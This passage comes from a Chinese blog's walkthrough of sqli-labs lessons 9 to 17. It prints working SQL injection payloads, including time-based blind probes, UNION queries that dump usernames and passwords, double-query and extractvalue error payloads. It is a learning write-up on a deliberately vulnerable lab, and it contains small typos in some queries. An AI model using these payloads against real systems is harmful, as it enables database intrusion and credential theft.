0,1</p><p>而100改成101的时候报错,所以表名第一位是e</p><p>然后就是漫长的盲注过程…所以盲注还是适合用脚本来跑,找WP的时候看到<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856" target="_blank" rel="noopener">其中一个WP</a>是有用脚本来跑的</p><h1 id="les9-GET-Blind-Time-based-Single-Quotes-String"><a href="#les9-GET-Blind-Time-based-Single-Quotes-String" class="headerlink" title="les9:GET- Blind- Time based- Single Quotes- String"></a>les9:GET- Blind- Time based- Single Quotes- String</h1><p>题目是<a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">时间盲注</a></p><p>时间盲注：界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p><p>果然,无论我输入?id=1也好,?id=1’也罢,?id=1”什么的也都是You’re in……</p><pre><code>?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>if(语句1,语句2,语句3)语句1正确则执行语句2,否则执行语句3</p><p>sleep(n)将程序hold住n秒</p><p>用left判断一下数据库名是不是security</p><pre><code>?id=1&apos; and (if(left(database(),8)=&apos;security&apos;,sleep(10),null)) %23</code></pre><p>果然加载了10s才加载完成</p><p>然后再构造一个判断表名的</p><pre><code>?id=1&apos; and (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(10),null)) %23</code></pre><p>又加载了10s,把100换成105,很快就加载出来了,看来是false了</p><p>把105换成103,102,101都不行,看来第一位是101了</p><p>对应ASCII码表,101为e,还记得是email</p><pre><code>?id=1&apos; and (if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),5)=&apos;email&apos;,sleep(10),null)) %23</code></pre><p>果然又要加载10s才行,后面的也是差不多的操作了…手工盲注还是比较的吃力费时的</p><h1 id="les10-GET-Blind-Time-based-Double-Quotes-String"><a href="#les10-GET-Blind-Time-based-Double-Quotes-String" class="headerlink" title="les10:GET-Blind- Time based- Double Quotes- String"></a>les10:GET-Blind- Time based- Double Quotes- String</h1><p>只需把les9的’改为”即可</p><h1 id="les11-POST-Error-Based-Single-quotes-String"><a href="#les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="les11:POST-Error Based-Single quotes-String"></a>les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-master/start.png" title="start"><!--more--><p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p><blockquote><p>Username:admin<br>Password:1</p></blockquote><p>然后就</p><img src="/2019/07/25/sqli-labs-master/failed1.png" title="failed"><p>再试试</p><blockquote><p>Username:admin<br>Password:1’ or 1=1 %23</p></blockquote><img src="/2019/07/25/sqli-labs-master/failed2.png" title="failed"><p>看到报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p></blockquote><p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅<br>把%23改为#之后</p><blockquote><p>Username:admin<br>Password:1’ or 1=1#</p></blockquote><img src="/2019/07/25/sqli-labs-master/successfully.png" title="successfully"><p>然后</p><blockquote><p>1’ order by 3#</p></blockquote><p>报错</p><blockquote><p>1’ order by 2#</p></blockquote><p>没问题,所以只有两列<br>看了一下源码:</p><blockquote><p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p></blockquote><p>然而上面所做的…就是我看WP之前所能做的…<br>接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a><br>发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p><blockquote><p>Username:’ union select database(),version()#👇</p></blockquote><img src="/2019/07/25/sqli-labs-master/dbname&version.png" title="dbname&version"><blockquote><p>Username:’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#👇</p></blockquote><img src="/2019/07/25/sqli-labs-master/tables.png" title="tables"><blockquote><p>Username:’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#👇</p></blockquote><img src="/2019/07/25/sqli-labs-master/columns.png" title="columns"><blockquote><p>Username:’ union select group_concat(username),group_concat(password)from users#👇</p></blockquote><img src="/2019/07/25/sqli-labs-master/username&passwd.png" title="username&passwd"><blockquote><p>Username:’ union select 1,group_concat(id)from users#👇</p></blockquote><img src="/2019/07/25/sqli-labs-master/id.png" title="id"><p>les11[完]–2019-7-26 19:58</p><hr><h1 id="les12-POST-Error-Based-Double-quotes-String"><a href="#les12-POST-Error-Based-Double-quotes-String" class="headerlink" title="les12:POST-Error Based- Double quotes- String"></a>les12:POST-Error Based- Double quotes- String</h1><h2 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h2><blockquote><p>username:1’</p></blockquote><p>failed,没有报错</p><blockquote><p>username:1”</p></blockquote><p>这下有显示报错了</p><img src="/2019/07/25/sqli-labs-master/12error.png" title="error"><p>这下知道了查询语句为👇</p><blockquote><p>$sql=”SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1”;</p></blockquote><h2 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h2><blockquote><p>“) order by 3#也像les11一样是不存在第三列的</p></blockquote><h2 id="其他步骤"><a href="#其他步骤" class="headerlink" title="其他步骤"></a>其他步骤</h2><p>就跟<a href="https://ocgittt.github.io/2019/07/25/sqli-labs-les11/">les11</a>一模一样了</p><hr><h1 id="les13-POST-Double-Injection-String-with-twist"><a href="#les13-POST-Double-Injection-String-with-twist" class="headerlink" title="les13:POST-Double Injection- String- with twist"></a>les13:POST-Double Injection- String- with twist</h1><p>看题目已经知道是带括号的单引号的查询语句</p><h2 id="猜语句-1"><a href="#猜语句-1" class="headerlink" title="猜语句"></a>猜语句</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">username:</span><span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/13error.png" title="error"><p>所以查询语句为:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=(<span class="string">'$uname'</span>) <span class="keyword">and</span> <span class="keyword">password</span>=(<span class="string">'$passwd'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p>然而如果像les12一样输入</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:') <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br></pre></td></tr></table></figure><p>会变成这样👇</p><img src="/2019/07/25/sqli-labs-master/13successfully.png" title="successfully logged in"><p>但是这样并没有像les12一样显示出username:1   password:2</p><p>所以要从另一个角度看,题目说着是double injection,那就来double injection的操作吧</p><p>复习一下double injection需要用到的函数:</p><blockquote><p>rand() 生成一个0-1的随机数<br>floor()取整<br>count()统计查询对象的总数<br>group by x 按x对查询结果进行分组</p></blockquote><p>具体原理可以看一下付杰博客的<a href="https://www.fujieace.com/penetration-test/sql-double-injection.html" target="_blank" rel="noopener">SQL双查询注入详解</a></p><h2 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,<span class="keyword">database</span>(),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="列"><a href="#列" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="值"><a href="#值" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">6</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>有问题,这个会变成logged in successfully,而没有报错因此得不到数据</p><hr><h1 id="les14-POST-Double-injection-Single-quotes-String-with-twist"><a href="#les14-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="les14:POST-Double-injection-Single quotes-String-with twist"></a>les14:POST-Double-injection-Single quotes-String-with twist</h1><p>题目好像跟les13的题目是一样的,但查询语句是不同的</p><p>试了几遍单引号和双引号都不行,投降查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">'"'</span>.<span class="variable">$uname</span>.<span class="string">'"'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">'"'</span>.<span class="variable">$passwd</span>.<span class="string">'"'</span>; </span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=<span class="variable">$uname</span> and password=<span class="variable">$passwd</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>观察了一下是在uname和passwd的基础上两边都加’”(一个单引号一个双引号)<br>故payload为 </p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" 语句 <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="库名-1"><a href="#库名-1" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> informaition_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="表名-1"><a href="#表名-1" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="列-1"><a href="#列-1" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="值-1"><a href="#值-1" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这里跟les13一样都变成logged in successfully了…</p><hr><h1 id="les15-POST-Blind-Boolian-Based-String"><a href="#les15-POST-Blind-Boolian-Based-String" class="headerlink" title="les15:POST-Blind- Boolian Based- String"></a>les15:POST-Blind- Boolian Based- String</h1><h2 id="猜语句-2"><a href="#猜语句-2" class="headerlink" title="猜语句"></a>猜语句</h2><p>题目没有说是单引号还是双引号,没有说带不带括号,所以只能一个一个试了</p><p>我之前试过用户名和密码都是admin的时候是登录成功的</p><p>所以我是这样来猜查询语句的:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">username</span><span class="selector-pseudo">:admin'</span>#</span><br><span class="line"><span class="selector-tag">password</span><span class="selector-pseudo">:admin</span></span><br></pre></td></tr></table></figure><p>如果这样能登录成功的话,那就是说语句是单引号那种,很幸运一下就登录成功了</p><p>接下来就可以开始注入了</p><h2 id="库名-2"><a href="#库名-2" class="headerlink" title="库名"></a>库名</h2><p>由于是时间盲注,我们可以使用if(string1,string2,string3),sleep(),ascii(),substr(string,n,n)这几个函数组合在一起进行操作</p><h3 id="库名第一个字母"><a href="#库名第一个字母" class="headerlink" title="库名第一个字母:"></a>库名第一个字母:</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))</span><br></pre></td></tr></table></figure><p>结果等了好一会,看来是成功了</p><p>然后</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))&gt;115,sleep(10),null))</span><br></pre></td></tr></table></figure><p>这回马上就加载完毕了,看来是执行了null</p><p>再换换数字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))&gt;110,sleep(10),null))#</span><br></pre></td></tr></table></figure><p>又等了不短的时间,得知这是大于110的</p><p>经过种种换数字的操作,我们得知库名的第一个字母的ASCII码为115,也就是’s’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))=115,sleep(10),null))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="库名-3"><a href="#库名-3" class="headerlink" title="库名"></a>库名</h3><p>由于前面的题的经验,我们可以知道库名是’security’</p><p>用下面的代码来验证一下是不是’security’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left(database(),8)='security',sleep(10),null))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>页面又加载了一段时间,看来是正确的</p><h2 id="表名-2"><a href="#表名-2" class="headerlink" title="表名"></a>表名</h2><h3 id="表名的第一个字母"><a href="#表名的第一个字母" class="headerlink" title="表名的第一个字母"></a>表名的第一个字母</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>大于100</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">105</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>小于105</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>等于101<br>所以表名的第一个字母是’e’</p><h3 id="第一个表名"><a href="#第一个表名" class="headerlink" title="第一个表名"></a>第一个表名</h3><p>又经验得第一个表名是’emails’</p><h3 id="第二个表名"><a href="#第二个表名" class="headerlink" title="第二个表名"></a>第二个表名</h3><p>根据经验第二个表名的第一个字母为’r’  ASCII码为114,下面来验证一下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>正确,看整个表名是否为’referers’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'referers'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>验证成功</p><h3 id="第三个表名"><a href="#第三个表名" class="headerlink" title="第三个表名"></a>第三个表名</h3><p>‘uagents’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">7</span>)=<span class="string">'uagents'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第四个表名"><a href="#第四个表名" class="headerlink" title="第四个表名"></a>第四个表名</h3><p>‘users’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)=<span class="string">'users'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="列-2"><a href="#列-2" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">85</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第一列"><a href="#第一列" class="headerlink" title="第一列"></a>第一列</h3><p>‘USER’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)=<span class="string">'USER'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第二列"><a href="#第二列" class="headerlink" title="第二列"></a>第二列</h3><p>‘CURRENT_CONNECTIONS’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">19</span>)=<span class="string">'CURRENT_CONNECTIONS'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第三列"><a href="#第三列" class="headerlink" title="第三列"></a>第三列</h3><p>‘TOTAL_CONNECTIONS’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">17</span>)=<span class="string">'CURRENT_CONNECTIONS'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第四列"><a href="#第四列" class="headerlink" title="第四列"></a>第四列</h3><p>‘id’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">2</span>)=<span class="string">'id'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第五列"><a href="#第五列" class="headerlink" title="第五列"></a>第五列</h3><p>‘username’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'username'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第六列"><a href="#第六列" class="headerlink" title="第六列"></a>第六列</h3><p>‘password’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">5</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="username值"><a href="#username值" class="headerlink" title="username值"></a>username值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="第一个值"><a href="#第一个值" class="headerlink" title="第一个值"></a>第一个值</h3><p>‘Dumb’</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)=<span class="string">'Dumb'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="……"><a href="#……" class="headerlink" title="……"></a>……</h3><h3 id="……-1"><a href="#……-1" class="headerlink" title="……"></a>……</h3><hr><h1 id="les16-POST-Blind-Boolian-time-Based-Double-quotes"><a href="#les16-POST-Blind-Boolian-time-Based-Double-quotes" class="headerlink" title="les16:POST-Blind-Boolian/time Based-Double quotes"></a>les16:POST-Blind-Boolian/time Based-Double quotes</h1><p>把les15的’改为”即可</p><hr><h1 id="les17-POST-Update-Query-Error-based-String"><a href="#les17-POST-Update-Query-Error-based-String" class="headerlink" title="les17:POST-Update Query- Error based - String"></a>les17:POST-Update Query- Error based - String</h1><p>这题目…第一次见update语句的题</p><p>update:用于修改表中的数据</p><p>用法:<br>UPDATE 表名 SET 列名 = 新值 WHERE 列名 = 表中某值</p><h2 id="猜语句-3"><a href="#猜语句-3" class="headerlink" title="猜语句"></a>猜语句</h2><p>用les15那种方法:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">username</span><span class="selector-pseudo">:admin'</span></span><br><span class="line"><span class="selector-tag">password</span><span class="selector-pseudo">:admin</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/172admin.png" title="不行"><p>只显示不行而没有得到想要的报错语句</p><p>换了一种方式:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">username:</span>admin</span><br><span class="line"><span class="symbol">password:</span>admin<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/17error.png" title="有语句了"><p>现在知道查询语句是单引号那种,再结合报错型盲注的语句即可</p><h2 id="库名-4"><a href="#库名-4" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="/2019/07/25/sqli-labs-master/17database.png" title="dbname"><h2 id="表名-3"><a href="#表名-3" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td 